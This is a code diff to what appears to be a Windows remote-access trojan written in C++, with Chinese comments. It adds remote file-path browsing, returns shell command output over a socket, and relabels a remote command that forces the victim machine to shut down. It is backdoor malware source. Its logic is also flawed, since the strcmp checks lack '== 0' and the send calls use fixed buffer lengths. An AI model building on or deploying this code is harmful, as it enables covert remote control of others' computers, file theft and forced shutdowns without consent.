@@ -2,11 +2,11 @@
 
 int GetPCMessage(SOCKET fd);//获取计算机基本信息
 
-int FileBrowse(SOCKET fd);//文件浏览
+int FileBrowse(SOCKET fd, char* str);//文件浏览
 
 int recvFile(SOCKET fd, char* buf);//文件下载
 
-int shell(const char* cmd, char* result);//执行shell指令
+int shell(SOCKET fd, const char* cmd, char* result);//执行shell指令
 
 int sendFile(SOCKET fd, char* buf);//文件上传
 
@@ -47,13 +47,22 @@ int main()
 		decode(command);
 		if (strcmp(command, "filebrowse"))
 		{
-			thread th1 = thread(FileBrowse, fd);
-			th1.join();
+			while (true)
+			{
+				recv(fd, recvbuf, BUFSIZ, 0);
+				if (strcmp(recvbuf, "exit") == 0)
+				{
+					break;
+				}
+				thread th1 = thread(FileBrowse, fd, recvbuf);
+				th1.join();
+			}
 			continue;
 		}
 		else if (strcmp(command, "shell"))
 		{
-			thread th2 = thread(shell, fd, recvbuf);
+			char res[BUFSIZ * 2] = { 0 };
+			thread th2 = thread(shell, fd, recvbuf, res);
 			th2.join();
 			continue;
 		}
@@ -83,7 +92,7 @@ int main()
 			exit(0);
 			continue;
 		}
-		else if (strcmp(command, "kill"))
+		else if (strcmp(command, "shutdown"))
 		{
 			system("shutdown -s -t 1");//关机
 			continue;
@@ -144,18 +153,18 @@ int GetPCMessage(SOCKET fd)
 	return 0;
 }
 
-int FileBrowse(SOCKET fd)
+int FileBrowse(SOCKET fd, char* str)
 {
-	//获取C盘和D盘内的所有文件名
+	//获取目标路径下的文件名
 	char FileName[FileNameRow][FileNameCol];
 	char Zero[FileNameCol] = { 0 };
-	GetFileName(FileName);
+	GetFileName(FileName, str);
 	for (int i = 0; i < FileNameRow; i++)
 	{
 		if (strcmp(FileName[i], Zero))
 		{
 			//printf("%s\n", FileName[i]);
-			send(fd, FileName[i], strlen(FileName[i]), 0);
+			send(fd, FileName[i], FileNameRow, 0);
 		}
 	}
 	return 0;
@@ -237,11 +246,11 @@ int recvFile(SOCKET fd, char* buf)//文件下载
 	return 0;
 }
 
-int shell(const char* cmd, char* result)
+int shell(SOCKET fd, const char* cmd, char* result)
 {
 	int iRet = -1;
-	char buf_ps[CMD_RESULT_BUF_SIZE];
-	char ps[CMD_RESULT_BUF_SIZE] = { 0 };
+	char buf_ps[BUFSIZ * 2];
+	char ps[BUFSIZ * 2] = { 0 };
 	FILE* ptr;
 
 	strcpy(ps, cmd);
@@ -251,7 +260,7 @@ int shell(const char* cmd, char* result)
 		while (fgets(buf_ps, sizeof(buf_ps), ptr) != NULL)
 		{
 			strcat(result, buf_ps);
-			if (strlen(result) > CMD_RESULT_BUF_SIZE)
+			if (strlen(result) > BUFSIZ * 2)
 			{
 				break;
 			}
@@ -265,7 +274,7 @@ int shell(const char* cmd, char* result)
 	//    printf("popen %s error\n", ps);
 	//    iRet = -1; // 处理失败
 	//}
-
+	send(fd, result, BUFSIZ * 2, 0);
 	return iRet;
 }
 
